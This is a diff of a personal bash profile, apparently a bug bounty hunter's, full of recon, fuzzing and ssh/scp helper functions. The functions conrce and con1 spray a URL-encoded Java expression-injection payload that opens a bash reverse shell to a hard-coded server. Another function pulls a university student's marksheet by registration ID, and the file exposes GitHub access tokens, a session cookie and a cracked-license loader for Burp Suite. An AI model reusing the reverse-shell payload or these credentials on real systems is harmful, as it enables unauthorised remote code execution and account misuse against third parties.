@@ -48,8 +48,8 @@ edpro(){
 	vim ~/tools/.bash_profile
 }
 burp(){
-	cd '/home/rocky/tools/burp/Burp Suite Professional Edition v2022.3.7'
-    java -noverify --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED -javaagent:Dr-FarFar.jar -jar burpsuite_pro_v2022.3.7.jar & exit
+	cd '/home/rocky/tools/burp/Burp Suite Professional Edition v2022.9.5'
+    java -noverify --add-opens=java.desktop/javax.swing=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED -javaagent:Dr-FarFar.jar -jar burpsuite_pro_v2022.9.5.jar & exit
 }
 getroot(){
 	cat $1 | rev | cut -d "." -f 1,2 | rev | sort -u | tee -a root-$1
@@ -184,7 +184,7 @@ rlist(){
     cat $1 | xargs -n1 -P4 -I{} recon.py {}
 }
 am(){
-    cat $1 | xargs -P4 -n1 -I{} amass enum -passive -nocolor -nolocaldb -config ~/tools/amass/config.ini -d {}
+    cat $1 | xargs -P8 -n1 -I{} amass enum -passive -nocolor -nolocaldb -config ~/tools/amass/config.ini -d {}
 }
 param(){
     arjun -u $1 -w ~/tools/tools/files/parameters.txt $2 $3 
@@ -236,7 +236,7 @@ enum(){
 
     #get data on active domains
     mkdir out
-    cat dns | httpx -status-code -content-length -title -no-color -silent -location -p 443,8443,80,8080 -td -t 100 -o out/index
+    cat dns | httpx -status-code -content-length -title -no-color -fr -silent -location -p 443,8443,80,8080,4443,4080,8000 -td -t 100 -o out/index
     
     #get active-domains
     cat out/index | awk '{print $1}' | sort -u > active-domains
@@ -255,7 +255,7 @@ sjack(){
     subjack -w $1 -t 100 -timeout 30 -c ~/tools/subjack/fingerprints.json -ssl
 }
 reconpad(){
-    ssh -i "~/tools/server/servers.pem" ubuntu@43.204.212.209
+    ssh -i "~/tools/server/servers.pem" ubuntu@3.108.220.233
 }
 checkey(){
     cat ~/bounty/maps-urls | sed "s/KEY_HERE/$1/g"
@@ -264,10 +264,10 @@ sdns(){
     shuffledns -d $1 -w $2 -r ~/tools/tools/files/resolvers.txt -strict-wildcard -silent
 }
 sendr(){
-    scp -i "~/tools/server/servers.pem" $1 ubuntu@43.204.212.209:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@3.108.220.233:/home/ubuntu/$2
 }
 recvr(){
-    scp -i "~/tools/server/servers.pem" ubuntu@43.204.212.209:/home/ubuntu/$1 $2
+    scp -i "~/tools/server/servers.pem" ubuntu@3.108.220.233:/home/ubuntu/$1 $2
 }
 fp(){
     find . -name $1 | xargs -n1 -I{} cat {} | sort -u
@@ -298,13 +298,13 @@ sqli(){
     python3 ~/tools/sqlmap/sqlmap.py -m $1 --dbs --batch --risk 3
 }
 fuzzer(){
-    ssh -i "~/tools/server/servers.pem" ubuntu@13.126.105.35
+    ssh -i "~/tools/server/servers.pem" ubuntu@65.2.63.86
 }
 sendf(){
-     scp -i "~/tools/server/servers.pem" $1 ubuntu@13.126.105.35:/home/ubuntu/$2
+     scp -i "~/tools/server/servers.pem" $1 ubuntu@65.2.63.86:/home/ubuntu/$2
 }
 recvf(){
-    scp -i "~/tools/server/servers.pem" ubuntu@13.126.105.35:/home/ubuntu/$1 $2
+    scp -i "~/tools/server/servers.pem" ubuntu@65.2.63.86:/home/ubuntu/$1 $2
 }
 dork-root(){
     echo -n site:*.;join.py $1 | sed 's/,/ | site:*./g'
@@ -319,25 +319,25 @@ sqlmf(){
     python3 ~/tools/sqlmap/sqlmap.py -r $1 --risk 3 --dbs --batch $2 $3 $4 $5 $6 $7 $8 $9
 }
 bounty(){
-    ssh -i "~/tools/server/servers.pem" ubuntu@52.66.245.73
+    ssh -i "~/tools/server/servers.pem" ubuntu@3.109.213.190
 }
 sendb(){
-    scp -i "~/tools/server/servers.pem" $1 ubuntu@52.66.245.73:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@3.109.213.190:/home/ubuntu/$2
 }
 recvb(){
-    scp -i "~/tools/server/servers.pem" ubuntu@52.66.245.73:/home/ubuntu/$1 $2
+    scp -i "~/tools/server/servers.pem" ubuntu@3.109.213.190:/home/ubuntu/$1 $2
 }
 asn(){
     curl -s "http://asnlookup.com/api/lookup?org=$1" | jq -r '.[]'
 }
 scanner(){
-    ssh -i "~/tools/server/servers.pem" ubuntu@3.110.208.108
+    ssh -i "~/tools/server/servers.pem" ubuntu@13.234.21.37
 }
 sends(){
-    scp -i "~/tools/server/servers.pem" $1 ubuntu@3.110.208.108:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@13.234.21.37:/home/ubuntu/$2
 }
 recvs(){
-    scp -i "~/tools/server/servers.pem" ubuntu@3.110.208.108:/home/ubuntu/$1 $2
+    scp -i "~/tools/server/servers.pem" ubuntu@13.234.21.37:/home/ubuntu/$1 $2
 }
 hx(){
     cat $1 | httpx -status-code -content-length -title -no-color -silent -location -td -t 100 
@@ -378,27 +378,27 @@ recvl(){
 }
 sendall(){
     echo 'reconpad'
-    scp -i "~/tools/server/servers.pem" $1 ubuntu@43.204.212.209:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@3.108.220.233:/home/ubuntu/$2
     echo 'fuzzer'
-    scp -i "~/tools/server/servers.pem" $1 ubuntu@13.126.105.35:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@65.2.63.86:/home/ubuntu/$2
     echo 'scanner'
-    scp -i "~/tools/server/servers.pem" $1 ubuntu@3.110.208.108:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@13.234.21.37:/home/ubuntu/$2
     echo 'bounty'
-    scp -i "~/tools/server/servers.pem" $1 ubuntu@52.66.245.73:/home/ubuntu/$2
-    echo 'receiver'
-    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@3.110.153.25:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" $1 ubuntu@3.109.213.190:/home/ubuntu/$2
+    echo 'uspad'
+    scp -i "~/tools/server/usservers.pem" -r $1 ubuntu@3.83.207.57:/home/ubuntu/$2
 }
 sendallr(){
     echo 'reconpad'
-    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@43.204.212.209:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@3.108.220.233:/home/ubuntu/$2
     echo 'fuzzer'
-    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@13.126.105.35:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@65.2.63.86:/home/ubuntu/$2
     echo 'scanner'
-    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@3.110.208.108:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@13.234.21.37:/home/ubuntu/$2
     echo 'bounty'
-    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@52.66.245.73:/home/ubuntu/$2
-    echo 'receiver'
-    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@3.110.153.25:/home/ubuntu/$2
+    scp -i "~/tools/server/servers.pem" -r $1 ubuntu@3.109.213.190:/home/ubuntu/$2
+    echo 'uspad'
+    scp -i "~/tools/server/usservers.pem" -r $1 ubuntu@3.83.207.57:/home/ubuntu/$2
 }
 
 c(){
@@ -447,14 +447,14 @@ grafana-tr(){
 domxss(){
     grep -Hnir -E "addEventListener\((?:'|\")message(?:'|\")" | awk -F '_' '{print $1}' | httpx -sc -cl
 }
-receiver(){
-    ssh -i "~/tools/server/servers.pem" ubuntu@3.110.153.25
+uspad(){
+    ssh -i "~/tools/server/usservers.pem" ubuntu@3.83.207.57
 }
-sendre(){
-    scp -i "~/tools/server/servers.pem" $1 ubuntu@3.110.153.25:/home/ubuntu/$2
+sendu(){
+    scp -i "~/tools/server/usservers.pem" $1 ubuntu@3.83.207.57:/home/ubuntu/$2
 }
-recvre(){
-    scp -i "~/tools/server/servers.pem" ubuntu@3.110.153.25:/home/ubuntu/$1 $2
+recvu(){
+    scp -i "~/tools/server/usservers.pem" ubuntu@3.83.207.57:/home/ubuntu/$1 $2
 }
 n(){
     gedit ~/notes & exit
@@ -481,10 +481,10 @@ sd(){
     cat targets-data.txt | grep -aE $1 | awk -F ',' '{print $1}' | xargs -n1 -I{} sh -c "cat http-result | grep -a {}" 
 }
 conrce(){
-    cat $1 | httpx -sc -cl -nc -path '/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/43.204.212.209/1270%200%3E%261%27%29.start%28%29%22%29%7D/'
+    cat $1 | httpx -sc -cl -nc -path '/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/3.108.220.233/1270%200%3E%261%27%29.start%28%29%22%29%7D/'
 }
 con1(){
-    echo $1 | httpx -sc -cl -nc -path '/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/43.204.212.209/1270%200%3E%261%27%29.start%28%29%22%29%7D/'
+    echo $1 | httpx -sc -cl -nc -path '/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/3.108.220.233/1270%200%3E%261%27%29.start%28%29%22%29%7D/'
 }
 autowhois(){
     cat $2 | xargs -n1 -I{} sh -c "whois {} | grep -aiE $1>/dev/null && echo {};sleep 1"
@@ -551,10 +551,35 @@ resv(){
     puredns resolve -r ~/tools/tools/files/resolvers.txt -w $1.out $1
 }
 dt(){
-    pwd | cut -d '/' -f5 | xargs -n1 -I{} sh -c "scp -i "~/tools/server/servers.pem" ubuntu@13.126.105.35:/home/ubuntu/{}.tar.gz ."
+    pwd | cut -d '/' -f5 | xargs -n1 -I{} sh -c "scp -i \"~/tools/server/servers.pem\" ubuntu@65.2.63.86:/home/ubuntu/{}.tar.gz . && tar -xzf {}.tar.gz"
 }
 ufr(){
     cat result.txt | awk '{print $1" ["$2"] "$3" "$4" "$5}' > r
     guniq 1 r | sort -n > uniq-result.txt
     rm r
+}
+components(){
+    mkdir components
+    mkdir components/$1 components/$2 components/$3
+    touch components/$1/$1.jsx components/$2/$2.jsx components/$3/$3.jsx
+    touch components/$1/$1.css components/$2/$2.css components/$3/$3.css
+}
+gu(){
+    gutest1 $1 | sort -u
+}
+gutest1(){
+    gauplus $1 &
+    waybackurls $1
+}
+ghs()
+{
+    for i in $(cat $1)
+    do
+        github-subdomains -d $i -t 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,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 -raw
+    done
+}
+getresult()
+{
+    paperid=$(curl -s -k -X $'POST'     -H $'Host: student.gehu.ac.in' -H $'Content-Length: 21' -H $'Accept: */*' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'     -b $'ASP.NET_SessionId=saaajgjgbucutv4a3hohqj12'     --data-binary $'yearSem=2&Regid=62018'     $'https://student.gehu.ac.in/Web_StudentAcademic/FillMarksheet' | jq .docNo | sed 's/"//g')
+    echo "https://student.gehu.ac.in/Web_StudentAcademic/DownloadFile?docNo=$paperid"
 }
